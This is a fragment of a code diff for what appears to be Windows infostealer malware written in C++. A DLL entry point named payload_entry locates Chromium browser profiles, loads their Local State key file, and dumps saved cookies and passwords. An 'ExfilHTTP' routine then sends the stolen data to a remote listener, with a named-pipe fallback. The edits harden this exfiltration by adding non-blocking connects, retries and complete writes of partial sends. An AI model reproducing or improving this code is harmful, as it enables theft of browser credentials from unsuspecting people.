+            else if(cr == -1 && fErr() == 10035 /*WSAEWOULDBLOCK*/){
+                CK_FD_SET wr; memset(&wr, 0, sizeof(wr));
+                wr.fd_count = 1; wr.fd_array[0] = s;
+                CK_TIMEVAL tv; tv.tv_sec = 5; tv.tv_usec = 0;
+                if(fSelect(0, 0, &wr, 0, &tv) > 0){
+                    int soerr = 0, sl = (int)sizeof(soerr);
+                    if(fGetOpt(s, 0xFFFF, 0x1007 /*SO_ERROR*/, (char*)&soerr, &sl) == 0 && soerr == 0)
+                        connected = true;
+                }
+            }
+            unsigned long blocking = 0;
+            fIoctl(s, (long)0x8004667E, &blocking);
+        } else {
+            connected = (fConnect(s, &addr, sizeof(addr)) == 0);
+        }
+        if(!connected){
             DbgInt("ExfilHTTP: connect failed (attempt)", attempt);
-            fClose(s2); continue;
+            fClose(s); continue;
         }
-        Dbg("ExfilHTTP: connected!");
-        int sent = fSend(s2, hdr, hn, 0);
-        DbgInt("ExfilHTTP: header sent", sent);
-        if(sent <= 0){ fClose(s2); continue; }
-        // Send body in 32KB chunks
-        size_t off = 0; int chunk = 32768;
+        Dbg("ExfilHTTP: connected");
+        int sent = 0;
+        while(sent < hn){
+            int r = fSend(s, hdr + sent, hn - sent, 0);
+            if(r <= 0) break;
+            sent += r;
+        }
+        if(sent != hn){ DbgInt("ExfilHTTP: header short", sent); fClose(s); continue; }
+        bool body_ok = true;
+        size_t off = 0;
         while(off < g_len){
-            int toSend = (g_len - off < chunk) ? (int)(g_len - off) : chunk;
-            int s = fSend(s2, g_out + off, toSend, 0);
-            if(s <= 0) break;
-            off += s;
+            int chunk = (g_len - off < 32768) ? (int)(g_len - off) : 32768;
+            int r = fSend(s, g_out + off, chunk, 0);
+            if(r <= 0){ body_ok = false; break; }
+            off += (size_t)r;
         }
         DbgInt("ExfilHTTP: body sent", (int)off);
-        // Read response (discard) -- bounded by the 30s timeout above
         char resp[256];
-        int r = fRecv(s2, resp, sizeof(resp), 0);
-        if(r > 0){ DbgInt("ExfilHTTP: response received", r); }
-        else if(r == 0){ Dbg("ExfilHTTP: connection closed by listener (no response body)"); }
-        else { DbgInt("ExfilHTTP: recv failed/timeout", GetLastError()); }
-        fClose(s2);
-        sent_ok = (off == g_len);
+        int r = fRecv(s, resp, sizeof(resp), 0);
+        if(r <= 0) Dbg("ExfilHTTP: no response (listener closed)");
+        fClose(s);
+        sent_ok = body_ok && (off == g_len);
     }
     fClean();
     return sent_ok;
@@ -1205,8 +1330,16 @@ static bool Sink(void){
     for(int i=0;i<20;i++){
         HANDLE p = CreateFileW(L"\\\\.\\pipe\\ck_pipe",GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
         if(p!=INVALID_HANDLE_VALUE){
-            DWORD wr=0; BOOL ok=WriteFile(p,g_out,(DWORD)g_len,&wr,NULL); CloseHandle(p);
-            return ok && wr==g_len;
+            // WriteFile on a pipe can return short; the old single call dropped
+            // the tail of any dump bigger than one pipe buffer and reported fail
+            DWORD wrote=0; bool ok=true;
+            while(wrote < (DWORD)g_len){
+                DWORD w=0;
+                if(!WriteFile(p,g_out+wrote,(DWORD)g_len-wrote,&w,NULL) || w==0){ ok=false; break; }
+                wrote += w;
+            }
+            CloseHandle(p);
+            if(ok) return true;
         }
         Sleep(250);
     }
@@ -1403,7 +1536,7 @@ extern "C" __declspec(dllexport) DWORD WINAPI payload_entry(HINSTANCE h, DWORD r
         if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES) lstrcpyW(root,alt);
         if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES) continue;
         Dbg("payload_entry: found chromium profile");
-        LoadLocalState(root);
+        LoadLocalState(g_br[i].name, root);
         DumpChromium(g_br[i].name,root,g_br[i].exe);
         DumpPasswords(g_br[i].name,root,g_br[i].exe);
     }
